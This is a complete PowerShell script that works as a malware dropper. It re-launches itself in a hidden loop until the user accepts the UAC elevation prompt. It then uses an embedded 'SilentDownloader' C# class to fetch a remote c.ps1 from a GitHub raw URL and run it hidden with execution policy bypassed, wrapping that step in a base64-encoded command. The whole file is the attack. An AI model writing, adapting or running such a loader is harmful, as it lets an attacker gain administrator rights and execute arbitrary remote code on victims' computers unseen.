# Function to check if script is running as Administrator
function Test-Admin {
    return ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
        [Security.Principal.WindowsBuiltInRole] "Administrator"
    )
}

# Keep prompting UAC until user clicks "Yes"
if (-not (Test-Admin)) {
    do {
        Start-Sleep -Milliseconds 500
        try {
            Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden -ErrorAction Stop
            Exit
        } catch {
            # User probably clicked "No" — loop continues
        }
    } while (-not (Test-Admin))
    exit
}

# Now inside elevated session — run hidden C# logic
$script = {
    Add-Type -TypeDefinition @"
using System;
using System.Net;
using System.IO;
using System.Diagnostics;

public class SilentDownloader
{
    public static void DownloadAndRun()
    {
        string url = "https://raw.githubusercontent.com/wagner012/wagner/refs/heads/main/c.ps1";
        string tempPath = Path.Combine(Path.GetTempPath(), "c.ps1");

        using (WebClient client = new WebClient())
        {
            client.DownloadFile(url, tempPath);
        }

        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "powershell.exe";
        psi.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File \"" + tempPath + "\"";
        psi.CreateNoWindow = true;
        psi.UseShellExecute = false;

        Process.Start(psi);
    }
}
"@

    [SilentDownloader]::DownloadAndRun()
}

# Encode and run silently in background
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($script.ToString()))
Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded" -WindowStyle Hidden
